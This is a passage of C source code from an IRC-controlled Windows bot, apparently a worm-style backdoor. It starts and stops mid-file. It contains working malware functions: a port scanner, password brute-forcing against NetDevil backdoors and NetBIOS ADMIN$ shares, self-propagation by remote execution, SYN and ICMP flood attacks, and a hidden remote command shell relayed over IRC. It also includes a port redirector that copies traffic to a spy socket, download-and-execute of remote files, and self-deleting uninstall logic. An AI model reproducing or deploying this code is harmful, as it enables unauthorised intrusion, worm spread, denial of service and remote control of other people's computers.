		if (select(0,NULL, &fd_struct, NULL, &time) < 1) {
			closesocket(sock[c]);
			continue;
		}
		else {//its open
			SOCKADDR socketname;
			int s = sizeof(socketname);
			getpeername(sock[c],&socketname,&s);
			memcpy(&iaddr.S_un.S_addr,&socketname.sa_data[2],4);
			sprintf(sendbuf,"%s:%i",inet_ntoa(iaddr),threads2[i].int_1);
			if (strlen(threads2[i].string2) > 1) { //log to file
				infile = fopen(threads2[i].string2,"aw");
				if (infile != NULL) {
					strcat(sendbuf,"\n");
					fputs(sendbuf,infile);
					fclose(infile);
				}
			}	
			privmsg(threads2[i].reply_sock,sendbuf,threads2[i].chan);
			if (threads2[i].int_3 == 0 || threads2[i].int_3 == 3) closesocket(sock[c]);
			#ifdef NB_SPREADER
			if (threads2[i].int_3 == 3) {
				if (InfectNetBIOS2(inet_ntoa(iaddr),threads2[i].reply_sock,threads2[i].chan) == 2) {
					privmsg(threads2[i].reply_sock,Error,threads2[i].chan);
					return 1;
				}
			}
			#endif
			if (threads2[i].int_3 == 4) {
				if (netdevil(inet_ntoa(iaddr),threads2[i].int_1,threads2[i].reply_sock,sock[c],threads2[i].chan) == 1) {
					sprintf(sendbuf,"ok %s",inet_ntoa(iaddr)),
					privmsg(threads2[i].reply_sock,sendbuf,threads2[i].chan);
				}
			}
		}
	}
	return 0;
}


int SUB7_Reciev(SOCKET sock)
{
	TIMEVAL time;
   	fd_set fd_struct;
    	time.tv_sec = 20;//timeout after 20 sec.
    	time.tv_usec = 0;
   	FD_ZERO(&fd_struct);
    	FD_SET(sock, &fd_struct);
	if (select(0, &fd_struct, NULL, NULL, &time) <= 0)
	{
		closesocket(sock); 
		return -1;
	}
	return 0;
}

int netdevil_upload(char * ip,SOCKET cSocket)
{
	SOCKET sock;
	unsigned int Fsize, Fsend, move;
	char rBuffer[1024];
	char rFile[MAX_PATH];
	char *dir;
	int port = 0;
	int bytes_sent = 0;
	//get the upload port
	DWORD mode = 0;
	send(cSocket, "version", 7, 0);
	memset(rBuffer,0,sizeof(rBuffer));
	recv(cSocket, rBuffer, sizeof(rBuffer), 0);
	if (strlen(rBuffer) > 5) {
		char *uPort;
		rBuffer[strlen(rBuffer)-2] = '\0';
		uPort = strrchr(rBuffer, '\n\r');
		if (uPort != NULL) 
			port = atoi(uPort);
	}
	char *ver;
	BOOL ver15 = FALSE;
	ver = strtok(rBuffer,"\n\r");
	if (strcmp(rBuffer,"ver1.5") == 0) ver15 = TRUE; 
	sprintf(rFile,"C:\\%s",filename);
	if (port == 0) port = 903;
	if ((sock = create_sock(ip,port)) < 1) goto end;
	HANDLE testfile = CreateFile(This_File,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE) 
		goto end;
	Fsize = GetFileSize(testfile,NULL);
	memset(rBuffer,0,sizeof(rBuffer));
	if (ver15)
		sprintf(rBuffer,"cmd[003]%s|%i|\n\r",rFile,Fsize);
	else
		sprintf(rBuffer,"%s\r1",rFile);
	send(sock, rBuffer, strlen(rBuffer), 0);
	if (recv(sock, rBuffer, sizeof(rBuffer), 0) < 1) goto end;
	while (Fsize) {
		int Fsend = 1024;
		memset(rBuffer,0,sizeof(rBuffer));
		if (Fsend>Fsize) Fsend=Fsize;
		move = 0-Fsize;
		SetFilePointer(testfile, move, NULL, FILE_END);
		ReadFile(testfile, rBuffer, Fsend, &mode, NULL);
		bytes_sent = send(sock, rBuffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (WSAGetLastError() != WSAEWOULDBLOCK) goto end;
			else bytes_sent = 0;
		}
		Fsize = Fsize - bytes_sent;
		if (!ver15 && recv(sock, rBuffer, sizeof(rBuffer), 0) < 1) goto end;
	}
	if (testfile != INVALID_HANDLE_VALUE) CloseHandle(testfile);
	closesocket(sock);
	Sleep(2000);
	sprintf(rBuffer,"pleaz_run%s",rFile);
	send(cSocket, rBuffer,strlen(rBuffer), 0);
	memset(rBuffer,0,sizeof(rBuffer));
	if (recv(cSocket, rBuffer, sizeof(rBuffer), 0) < 1) goto end;
	if (strcmp(rBuffer,"pleaz_run_done") != 0) goto end;
	Sleep(4000);
	//send(cSocket, "put something here to remove the netdevil server i dont know what :P",14,0);
	closesocket(cSocket);
	return 1;
	end:;
	closesocket(sock);
	closesocket(cSocket);
	return 0;
}


int netdevil(char *ip,int port,SOCKET ircsock,SOCKET sock,char *chan)
{
	
	char rBuffer[512];
	DWORD mode = 0;
	DWORD err;
	ioctlsocket(sock,FIONBIO,&mode); //set the socket back to blocking
	int c;
	for (c=1;passwords[c] != NULL;c++)
	{
		Sleep(50);

		memset(rBuffer,0,sizeof(rBuffer));
		if (SUB7_Reciev(sock) == -1) break;

		if (recv(sock, rBuffer, sizeof(rBuffer), 0) <= 0) break;
		if (strcmp(rBuffer,"passed") == 0) {
			sprintf(rBuffer,"nd %s %s",ip ,passwords[c-1]); 
			privmsg(ircsock,rBuffer,chan);	

			if (netdevil_upload(ip,sock) == 1) {
				closesocket(sock);
				return 1;
			}
			break;	

		}
		if (strcmp(rBuffer,"pass_pleaz") == 0) {
			memset(rBuffer,0,sizeof(rBuffer));
			sprintf(rBuffer,"pass_pleaz%s",passwords[c]); 
			send(sock,rBuffer ,strlen(rBuffer), 0);
			continue;
		}
		else break;
	}
	closesocket(sock);
	return 0;
}


#ifdef NB_SPREADER


typedef int (__stdcall *RSP2)(LPNETRESOURCE, LPCTSTR, LPCTSTR,DWORD);
RSP2 fWNetAddConnection2;

typedef int (__stdcall *RSP3)(LPTSTR, DWORD, BOOL);
RSP3 fWNetCancelConnection2;

typedef NET_API_STATUS (__stdcall *NRT) (LPWSTR UncServerName, LPBYTE *BufferPtr);
NRT fNetRemoteTOD;

typedef NET_API_STATUS (__stdcall *NSJA) (LPWSTR ServerName, LPBYTE Buffer, LPDWORD JobId);
NSJA fNetScheduleJobAdd;

typedef NET_API_STATUS (__stdcall *NABF) (LPVOID Buffer );
NABF fNetApiBufferFree;

typedef NET_API_STATUS (__stdcall *lol) (LPWSTR,DWORD,DWORD, DWORD,DWORD,LPDWORD,PVOID);
lol fNetQueryDisplayInformation;

char usernames[10][251]={ 0 };
char extrapasswords[50][251]={ 0 };
//thanks to www.msdn.com and also many thanks to bill gates who has put a backdoor in almost any pc running windows I LOVE YA BILL great work 
int InfectNetBIOS2(char * Addr,SOCKET sock,char *chan) 
{
	char szRemoteAddr[MAX_PATH];
	char ADMINAddr[MAX_PATH];
	char Remotepath[MAX_PATH];
	char Remotesystemini[MAX_PATH];
	char sendbuf[512];
	char temp_user[250];
	char temp_pass[250];
	int i,c,err,t,w;
	sprintf(szRemoteAddr,"\\\\%s",Addr);
	sprintf(ADMINAddr,"%s\\ADMIN$",szRemoteAddr);
	wchar_t servername[1024] = L"";
	mbstowcs(servername, szRemoteAddr, strlen(szRemoteAddr) + 1);
	HINSTANCE mpr_dll = LoadLibrary("mpr.dll");
	HINSTANCE netapi32_dll = LoadLibrary("netapi32.dll");
	if (mpr_dll && netapi32_dll) {
		fWNetAddConnection2 = (RSP2) GetProcAddress(mpr_dll, "WNetAddConnection2A");
		fWNetCancelConnection2 = (RSP3) GetProcAddress(mpr_dll, "WNetCancelConnection2A");
		fNetRemoteTOD = (NRT) GetProcAddress(netapi32_dll, "NetRemoteTOD");
        	fNetScheduleJobAdd = (NSJA) GetProcAddress(netapi32_dll, "NetScheduleJobAdd");
        	fNetApiBufferFree = (NABF) GetProcAddress(netapi32_dll, "NetApiBufferFree");
		fNetQueryDisplayInformation = (lol) GetProcAddress(netapi32_dll, "NetQueryDisplayInformation");
		if (!fWNetCancelConnection2 || !fWNetAddConnection2 || !fNetRemoteTOD || !fNetScheduleJobAdd || !fNetApiBufferFree || !fNetQueryDisplayInformation) {
			//not xp/2000/nt ?
			return 2;
		}
	}
	else
		return 2; //dll's not found
	NETRESOURCE netresource;
	memset(&netresource, 0, sizeof netresource);
	netresource.lpRemoteName = szRemoteAddr;
	netresource.dwType       = RESOURCETYPE_DISK;	// 1
	netresource.lpLocalName  = NULL;
	netresource.lpProvider   = NULL;
	char username[100];
	err = fWNetAddConnection2(&netresource, "", "", 0);
	if (err != NERR_Success) {
		goto end;
	}
	//get usernames////
	void *buf;
	NET_DISPLAY_USER *ndu;
	DWORD read, next_index, rc, x;
	int u;
	next_index = 0;
	do
	{
		buf = NULL;
		rc = fNetQueryDisplayInformation( servername, 1, next_index, 10, 1024, &read, &buf );
		if ( rc != ERROR_MORE_DATA && rc != ERROR_SUCCESS )
			break;
		for ( x = 0,u=0, ndu = (NET_DISPLAY_USER *) buf; x < read; ++ x, ++ ndu )
		{
			memset(temp_user,0,sizeof(temp_user));
			sprintf(temp_user,"%-40.40S ",ndu->usri1_name);
			if (x < 5) 
				strcpy(usernames[x],temp_user);
			int t;
			for (w=0,t=0;w != strlen(temp_user);w++,t++) {
				if (temp_user[w] != 32) 
					extrapasswords[u][t] = temp_user[w];
				else {
					extrapasswords[u][t+1] = '\0';
					u++;
					t=0;
				}
			}
			//usernames[u][w+1] = '\0';
			u++;
		}
		if ( read > 0 )
				next_index = ((NET_DISPLAY_USER *)buf)[read - 1].usri1_next_index;
		else 
			break;

		if ( buf != NULL )
			fNetApiBufferFree( buf );

	} while (rc == ERROR_MORE_DATA);
	if ( buf != NULL )
		fNetApiBufferFree( buf );
	if (u == 0) goto end;

	//end get usernames////
	memset(&netresource, 0, sizeof netresource);
	netresource.lpRemoteName = ADMINAddr;
	netresource.dwType       = RESOURCETYPE_DISK;	// 1
	netresource.lpLocalName  = NULL;
	netresource.lpProvider   = NULL;
	restart:;
	for (t=0;t != 4 && usernames[t] != NULL;t++)
	{
		c=0;
		BOOL try_usernames = TRUE;
		while (1) {
			memset(temp_pass,0,sizeof(temp_pass));
			if (try_usernames) {
				if (extrapasswords[c] == NULL) { c=0; try_usernames = FALSE; continue; }
				strcpy(temp_pass,extrapasswords[c]);
			}
			else {
				if (passwords[c] == NULL)
					break;
				strcpy(temp_pass,passwords[c]);
			}
			err = fWNetAddConnection2(&netresource, temp_pass, usernames[t] , 0);
			if (err == NERR_Success) //success copy file and write startup key
			{
				fWNetCancelConnection2(ADMINAddr,0, TRUE);
				fWNetCancelConnection2(szRemoteAddr,0, TRUE);
				char file[MAX_PATH];
				GetSystemDirectory(file, sizeof(file));
				strcat(file,"\\pqonwe.exe");
				//if (GetFileAttributes(file) == 0xFFFFFFFF) Extractpsexec(file);
				char commandline[512];
				DWORD exits;
				char buffer[512];
				BOOL found;
				Sleep(2000);
				if (strlen(temp_pass) == 0) 
					sprintf(commandline,"\\\\%s -u %s -p %s -f -c -d %s",Addr,usernames[t],temp_pass,This_File);
				else 
					sprintf(commandline,"\\\\%s -u %s -f -c -d %s",Addr,usernames[t],This_File);
				ShellExecute(0, "open", file,commandline  , NULL, SW_HIDE);
				Sleep(8000);
				sprintf(sendbuf,"%s %s %s",Addr,usernames[t],temp_pass);
				privmsg(sock,sendbuf,chan);
				FreeLibrary(mpr_dll);
				FreeLibrary(netapi32_dll);
				return 0;

			}
			else if (err != 1326) break; //i think 1326 means invalid password all other replys will problebly say we cant login
		//fWNetCancelConnection2(ADMINAddr,0, TRUE);
		//fWNetCancelConnection2(szRemoteAddr,0, TRUE);
		}
	}
	end:;
	fWNetCancelConnection2(ADMINAddr,0, TRUE);
	fWNetCancelConnection2(szRemoteAddr,0, TRUE);
	FreeLibrary(mpr_dll);
	FreeLibrary(netapi32_dll);
	return 1;
}
#endif



#ifdef SYN_FLOOD
#define MAX_SYNFLOOD_SOCKETS_TO_USE 200
DWORD WINAPI syn_flood(LPVOID param)
{
	int x = (int)param;
	SOCKADDR_IN    SockAddr;
   	SOCKET         sock[MAX_SYNFLOOD_SOCKETS_TO_USE];//we are gone use 200 sockets
   	IN_ADDR iaddr;
	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(threads2[x].int_1);
	LPHOSTENT lpHostEntry = NULL;
 	DWORD mode = 1;
	int c,i;
	iaddr.s_addr = inet_addr(threads2[x].string1);
	if (iaddr.s_addr == INADDR_NONE) lpHostEntry = gethostbyname(threads2[x].string1);
	if (lpHostEntry == NULL && iaddr.s_addr == INADDR_NONE) { //error dns
		clearthread(x);	
		return 0;
	}
	if (lpHostEntry != NULL)
		SockAddr.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list); //hostname
	else
		SockAddr.sin_addr = iaddr; //ip address
	i = 0;
	while (i < threads2[x].int_3) {
		for (c=0;c<MAX_SYNFLOOD_SOCKETS_TO_USE;c++)
		{
			if (threads2[x].int_1 == 0) {
				srand(GetTickCount());
				SockAddr.sin_port = htons(rand()%60000+1);
			}
			sock[c] = socket(AF_INET, SOCK_STREAM, 0);
   			if (sock[c] == INVALID_SOCKET)
      				break;
			ioctlsocket(sock[c],FIONBIO,&mode);
		}
		for (c=0;c<MAX_SYNFLOOD_SOCKETS_TO_USE;c++)
  			connect(sock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
      		Sleep(threads2[x].int_2);     
		for (c=0;c<MAX_SYNFLOOD_SOCKETS_TO_USE;c++)
			closesocket(sock[c]); //close all sockets
		i++;
	}
	clearthread(x);	
	return 0;
}
#endif

#ifdef remote_cmd
void Close_Handles()
{
	if (pipe_read != INVALID_HANDLE_VALUE) CloseHandle(pipe_read);
	if (pipe_write != INVALID_HANDLE_VALUE) CloseHandle(pipe_write);
	if (pipe_Hproc != INVALID_HANDLE_VALUE) CloseHandle(pipe_Hproc);
}


int open_cmd(SOCKET sock,char * chan)
{
	Close_Handles();
	char searsdir[MAX_PATH];
  	SECURITY_ATTRIBUTES secAttr;
  	STARTUPINFO startInfo;
  	PROCESS_INFORMATION procInfo;
	HANDLE hChildOutRd, hChildOutWr, hChildInRd, hChildInWr;
	//sears for cmd.exe
	GetWindowsDirectory(searsdir,sizeof(searsdir));
	strcat(searsdir,"\\cmd.exe");
	if (GetFileAttributes(searsdir) == 0xFFFFFFFF) {
		GetSystemDirectory(searsdir,sizeof(searsdir));
		strcat(searsdir,"\\cmd.exe");
		if (GetFileAttributes(searsdir) == 0xFFFFFFFF) return -1;
	}
    	secAttr.nLength = sizeof(secAttr);
    	secAttr.bInheritHandle = TRUE;
    	secAttr.lpSecurityDescriptor = NULL;

    	if (!CreatePipe(&hChildOutRd, &hChildOutWr, &secAttr, 0)) return -1;
    	if (!CreatePipe(&hChildInRd, &hChildInWr, &secAttr, 0)) return -1;
    	if (!DuplicateHandle(GetCurrentProcess(), hChildInWr, GetCurrentProcess(), &hChildInWrDupe, 0, FALSE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE)) return -1;

   	memset(&startInfo, 0, sizeof(startInfo));
   	startInfo.cb = sizeof(startInfo);
    	startInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    	startInfo.wShowWindow = SW_HIDE;
    	startInfo.hStdInput = hChildInRd;
    	startInfo.hStdOutput = hChildOutWr;
   	if (!CreateProcess(searsdir,"", NULL, NULL, TRUE, 0, NULL, NULL, &startInfo, &procInfo)) 
		return -1;
   	CloseHandle(hChildInRd);
	DWORD id;
	pipe_read = hChildOutRd;
	pipe_write = hChildInWr;
	pipe_Hproc = procInfo.hProcess;
   	CloseHandle(procInfo.hThread);
	pipesock = sock;
	if (chan) sprintf(pipe_chan,chan);
	else sprintf(pipe_chan,"\0");
	CreateThread(NULL, 0, &PipeReadThread, NULL, 0, &id);
        return 0;
}




DWORD WINAPI PipeReadThread(LPVOID param)
{
	DWORD numread, br;
	char buffer[512];
	while (1)
	{
		BOOL eol = FALSE;
		DWORD State;

		memset(buffer,0,sizeof(buffer));
		if (!PeekNamedPipe(pipe_read,buffer,512,&br,NULL,NULL)) {
			pipe_send(pipesock,pipe_chan,Error);
			return 0;
		}

		if (br == 0) { //nothing to read 
			if (GetExitCodeProcess(pipe_Hproc,&State)) { //maybe process is death ?
				if (State != STILL_ACTIVE) {
					Close_Handles(); 
					pipe_send(pipesock,pipe_chan,"P exit");
					return 0;
				}
			}
			Sleep(10); //process is waithing sleep and try again
			continue;
		}
		DWORD cbyte;
		for(cbyte=0;cbyte<br;cbyte++) {
			if (buffer[cbyte] == '\n')
			{
				eol = TRUE;
				break;
			}
		}
		if (eol) br = cbyte + 1;
		else br = 512;
		memset(buffer,0,sizeof(buffer));
		if (!ReadFile(pipe_read, buffer, br, &numread, NULL)) 
				break;
		pipe_send(pipesock,pipe_chan,buffer);

	}
	pipe_send(pipesock,pipe_chan,Error);
        return 0;
}
int pipe_send(SOCKET sock,char *chan,char *buf)
{
	if (!privmsg(sock,buf,chan)) Close_Handles();
	if (strlen(chan) > 2) Sleep(Flood_delay); //we dont want a excess flood
	return 0;
}
#endif
SOCKET create_sock(char *host, int port)
{
	DWORD err;
        LPHOSTENT lpHostEntry = NULL;
   	SOCKADDR_IN  SockAddr;
   	SOCKET sock;
   	IN_ADDR iaddr;
   	if ((sock = socket( AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
      		return -1;
	memset(&SockAddr, 0, sizeof(SockAddr));
   	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(port);
	iaddr.s_addr = inet_addr(host);
	if (iaddr.s_addr == INADDR_NONE)  lpHostEntry = gethostbyname(host); //hostname
	if (lpHostEntry == NULL && iaddr.s_addr == INADDR_NONE)  //error dns we return -2
		return -2;
	if (lpHostEntry != NULL)
		SockAddr.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list); //hostname
	else
		SockAddr.sin_addr = iaddr; //ip address
	if (connect(sock, (SOCKADDR *) &SockAddr, sizeof(SockAddr)) == SOCKET_ERROR) {
		closesocket(sock);
		return -1;
	}
	return sock;
}
SOCKET Listen(int port)
{
	SOCKET sock;
	SOCKADDR_IN  SockAddr;
   	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) 
      		return -1;
	memset(&SockAddr, 0, sizeof(SockAddr));
   	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(port);
	SockAddr.sin_addr.s_addr = INADDR_ANY;  
	if (bind(sock, (SOCKADDR *)&SockAddr, sizeof(SockAddr)) != 0) 
		return -1;//port is in use ?
	if (listen(sock, SOMAXCONN) != 0) 
		return -1;
	return sock;
}


SOCKET redirectsock_in;


int redirect_transfer(SOCKET sock_in,SOCKET sock_out)
{
	char buf[4096];	
	memset(buf, 0, sizeof(buf));
	DWORD err,err2,err3;
	err = recv(sock_in,buf,sizeof(buf),0);
	if (err == 0) return -1;
	if (err == SOCKET_ERROR) {
		if (WSAGetLastError() == WSAEWOULDBLOCK) return 0;
		return -1;
	}
	err2 = send(sock_out,buf,err,0);
	if (redirectspy > 0) {
		if (send(redirectspy,buf,err,0) < 1) redirectspy = 0;
	}
	if (err2 == 0) return -1;
	if (err2 == SOCKET_ERROR) {
		if (WSAGetLastError() == WSAEWOULDBLOCK) return 0;
		return -1;
	}
	return 0;
}
DWORD WINAPI redirect_io(LPVOID param)
{
	int i = (int)param;
	SOCKET sock_out;
	SOCKET sock_in;
	sock_in = redirectsock_in;
	if ((sock_out = create_sock(threads2[i].string1,threads2[i].int_2)) < 1) {
		closesocket(sock_in);
		return 0;
	}
	unsigned long mode = 1;
	ioctlsocket(sock_out,FIONBIO,&mode);
	ioctlsocket(sock_in,FIONBIO,&mode);
  	fd_set fd_struct;

   	while (1)
   	{
		FD_ZERO(&fd_struct);
      		FD_SET(sock_in, &fd_struct);
     		FD_SET(sock_out, &fd_struct);
      		if (select(0, &fd_struct, NULL, NULL, NULL) == SOCKET_ERROR) 
			break;
      		if (FD_ISSET(sock_in, &fd_struct)) 
      			if (redirect_transfer(sock_in,sock_out) == -1) break;
       		if (FD_ISSET(sock_out,&fd_struct)) 
			if (redirect_transfer(sock_out,sock_in) == -1) break;
   	}
	closesocket(sock_out);
	closesocket(sock_in);
	return 0;
}
DWORD WINAPI port_redirect(LPVOID param)
{
	int i = (int)param;
	SOCKADDR_IN SockAddr;
	int addrlen;
	DWORD id;
	while (1) {
		addrlen = sizeof(SockAddr);
		if ((redirectsock_in = accept(threads2[i].Threads_sock, (SOCKADDR *)&SockAddr,&addrlen)) == INVALID_SOCKET)  
			break;
		CreateThread(NULL, 0, &redirect_io, (LPVOID)i, 0, &id);
		Sleep(10);
	}
	closesocket(threads2[i].Threads_sock);
	clearthread(i);
	return 0;
}

DWORD WINAPI download(LPVOID param)
{
	int num = (int)param;
	//we need the address of the server..
	//first part of the url should always be http://
	//we could use InternetOpenUrl but why do it easy if we can do it the hard way :D and its a bit better this way
	char host[250];
	char Rfilename[512];
	memset(Rfilename,0,sizeof(Rfilename));
	memset(host,0,sizeof(host));
	char sendbuf[512];
	char buffer[4096];
	char *buffer2;
	int c,d,p,port;
	BOOL useport = FALSE;
	BOOL success = FALSE;
	d=0;
	char tempport[6];
	for (c=7;c<strlen(threads2[num].string1);c++,d++)
	{
		if (threads2[num].string1[c] == '/') break;
		else if (threads2[num].string1[c] == ':') { //not port 80 ?
			p=0;
			useport = TRUE;
		}
		else if (useport) {
			tempport[p] = threads2[num].string1[c];
			p++;
		}
		else host[d] = threads2[num].string1[c];
	}
	if (useport) { tempport[p] = '\0'; port = atoi(tempport); }
	else port = 80;
	host[d+1] = '\0';
	//next create GET filename string 
	strcpy(Rfilename,"GET ");
	for (d=0;c<strlen(threads2[num].string1);c++,d++)
		sendbuf[d] = threads2[num].string1[c];
	sendbuf[d+1] = '\0';
	sprintf(Rfilename,"GET %s HTTP/1.1\r\n Accept: */*\r\nAccept-Language: uk\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nHost: %s:%i\r\nConnection: Keep-Alive\r\n\r\n",sendbuf,host,port);

	HANDLE filehandle;

	//now lets make a connection and download the shit 
	if ((threads2[num].Threads_sock = create_sock(host,port)) < 1) {// could not connect
		sprintf(sendbuf,Error);
		goto end;
	}
	send(threads2[num].Threads_sock,Rfilename,strlen(Rfilename),0);
	int size = 0;
	BOOL uninstall = FALSE;
	if (strlen(threads2[num].string2) < 1) {
		 uninstall = TRUE;
		char tempdir[MAX_PATH]; 
		GetTempPath(sizeof(tempdir), tempdir);
		srand(GetTickCount());
		char rFile[6];
		srand(GetTickCount());
		int x;
		for (x=0;x<4;x++)
			rFile[x] = (rand()%26)+97;
		rFile[x+1] = '\0';
		sprintf(threads2[num].string2,"%s\\%s.exe",tempdir,rFile);
	}
	filehandle = CreateFile(threads2[num].string2, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
	if (filehandle == INVALID_HANDLE_VALUE) {
		sprintf(sendbuf,"Error creating local file");
		goto end;
	}
	CloseHandle(filehandle);
	FILE *file = NULL;
 	file = fopen(threads2[num].string2,"wb");
	int i = 0;
 	while(1) {
                memset(buffer,0,sizeof(buffer));
                if ((i = recv(threads2[num].Threads_sock,buffer,4096,0)) <= 0) {
			sprintf(sendbuf,"Error recieving file");	
			goto end;
		}
                if (i < 4096) buffer[i]=0;
                for (d=0;d<i;d++) {
			if (!strncmp(buffer+d,"\r\n\r\n",4)) {
				size = i-d-4;
                        	for (d+=4;d<i;d++) 
					fputc(buffer[d],file);
				goto done;
                       }
                }
        }
        done:
        while(1) {
		memset(buffer,0,sizeof(buffer));
		i = recv(threads2[num].Threads_sock,buffer,4096,0);
                if (i == 0) {
			if (uninstall) {
				fclose(file);
				if (size < min_update_filesize) { //the file is smaller than xkb something must be wrong
					sprintf(sendbuf,Error);
					break;
				}
				TerminateThread(keepkeys_Handle,0);
				if ((int) ShellExecute(0, "open", threads2[num].string2, NULL, NULL, SW_SHOW) < 33) {
					sprintf(sendbuf,Error);
					break;
				}
				#ifdef update_after_x_days_not_logged_in
				set_new_date();
				#endif
				writekeys(TRUE);
			}
			success = TRUE;
			sprintf(sendbuf,"down. to %s s: %i b",threads2[num].string2,size);
			break;
		}
		if (i < 0) { //socket error
			sprintf(sendbuf,Error);
			break;
		}
                if (i < 4096) buffer[i]=0;
		size = size+i;
                for (d=0;d<i;d++) 
			fputc(buffer[d],file);  
        }
	end:;
	if (file != NULL) fclose(file);
	if (!success) DeleteFile(threads2[num].string2);
	if (threads2[num].Threads_sock > 0) closesocket(threads2[num].Threads_sock);
	privmsg(threads2[num].reply_sock,sendbuf,threads2[num].chan);
	clearthread(num);
	return 0;
}

void uninstall(void)
{
	char batfile[MAX_PATH]; 
	char tempdir[MAX_PATH]; 
	char cfilename[MAX_PATH];
	char tcmdline[MAX_PATH];
	char cmdline[MAX_PATH];
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	GetTempPath(sizeof(tempdir), tempdir);
	sprintf(batfile, "%s\\rs.bat", tempdir);
	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f != INVALID_HANDLE_VALUE) {
		// write a batch file to remove our executable once we close
		WriteFile(f, "@echo off\r\n"
					 ":start\r\nif not exist \"\"%1\"\" goto done\r\n"
					 "del /F \"\"%1\"\"\r\n"
					 "del \"\"%1\"\"\r\n"
					 "goto start\r\n"
					 ":done\r\n"
					 "del /F %temp%\rs.bat\r\n"
					 "del %temp%\r.bat\r\n", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;

		sprintf(tcmdline, "%%comspec%% /c %s %s", batfile, This_File); // build command line
		ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); // put the name of the command interpreter into the command line

		// execute the batch file
		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
	WSACleanup();
	ExitProcess(0);
 }

typedef unsigned long IPAddr;
typedef struct ip_option_information {
 	unsigned char Ttl;
 	unsigned char Tos;
 	unsigned char Flags;
 	unsigned char OptionsSize;
 	unsigned char FAR *OptionsData;
 } IP_OPTION_INFORMATION, *PIP_OPTION_INFORMATION;
typedef struct icmp_echo_reply {
 	IPAddr Address;
 	unsigned long Status;
 	unsigned long RoundTripTime;
 	unsigned short DataSize;
 	unsigned short Reserved;
 	void FAR *Data;
 	struct ip_option_information Options;
 } ICMP_ECHO_REPLY;
// icmp.dll function variables
 typedef int (__stdcall *ICF)(VOID);
 ICF fIcmpCreateFile;
 typedef int (__stdcall *ISE)(HANDLE, IPAddr, LPVOID, WORD, PIP_OPTION_INFORMATION, LPVOID, DWORD, DWORD);
 ISE fIcmpSendEcho;
 typedef int (__stdcall *ICH)(HANDLE);
 ICH fIcmpCloseHandle;

//  function for sending pings
 DWORD WINAPI ping(LPVOID param)
 {
	int num = (int)param;
	char ping_buff[65500];
	HINSTANCE icmp_dll = LoadLibrary("ICMP.DLL");
    	if (icmp_dll == 0) goto err;
 	else {
	 	fIcmpCreateFile  = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
 		fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
 		fIcmpSendEcho    = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");
 		if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho) 
	   		goto err;
	}
	HANDLE icmp;
	LPHOSTENT lpHostEntry = NULL;
	SOCKADDR_IN    SockAddr;
	IN_ADDR iaddr;
	IPAddr ip;
	ICMP_ECHO_REPLY reply;
	int i;
	char sendbuf[512];
	

	iaddr.s_addr = inet_addr(threads2[num].string1);
	if (iaddr.s_addr == INADDR_NONE)  lpHostEntry = gethostbyname(threads2[num].string1); //hostname
	if (lpHostEntry == NULL && iaddr.s_addr == INADDR_NONE)  //error dns
		goto err;
	if (lpHostEntry != NULL)
		ip = *(DWORD*)*lpHostEntry->h_addr_list; //hostname
	else
		ip = iaddr.s_addr; //ip address
	icmp = (HANDLE)fIcmpCreateFile();
	if (icmp == INVALID_HANDLE_VALUE) goto err;
	memset(&reply, 0, sizeof(reply));
	reply.RoundTripTime = 0xffffffff;
	memset(ping_buff,37,sizeof(ping_buff));
	int size;
	if (threads2[num].int_1 != 0) size = threads2[num].int_1;
	for (i = 0; i < threads2[num].int_3; i++) {
		if (threads2[num].int_1 == 0) {
			srand(GetTickCount());		
			size = (rand()%65000)+100;
		}
		fIcmpSendEcho(icmp, ip,ping_buff, size, NULL, &reply, sizeof(ICMP_ECHO_REPLY), threads2[num].int_2);
	}
	fIcmpCloseHandle(icmp);
	FreeLibrary(icmp_dll);
	sprintf(sendbuf,"p %s\n",threads2[num].string1);
	privmsg(threads2[num].reply_sock,sendbuf,threads2[num].chan);
	err:;
	clearthread(num);
	return 0;
 }


typedef struct clone_struct {
	BOOL used;//if true socket is in use
	SOCKET sock;
	HANDLE Handle;
	char server[512];
	int port;
} clonestr;

clonestr clone_data[50];//max 50 clones


void clone_send(char *buf)
{
	int c;
	strcat(buf,"\n");
	for(c=0;c<50;c++)
		if (clone_data[c].used == TRUE && clone_data[c].sock > 0) send(clone_data[c].sock,buf,strlen(buf),0);
}

char * clone_nick(char *nick)
{
	int c, len;
	srand(GetTickCount());
	len = (rand()%6)+4;
	for (c=0; c<len; c++) nick[c] = (rand()%26)+97;
	nick[c+1] = '\0';
	return nick;
}

DWORD WINAPI spam(LPVOID Param)
{
	int num = (int)Param;
	int c;
	int i;
	char buf[512];
	for (c=0;c<count_sNicks;c++)
	{
		for(i=0;i<50;i++) {
			if (clone_data[i].used == TRUE && clone_data[i].sock > 0) {
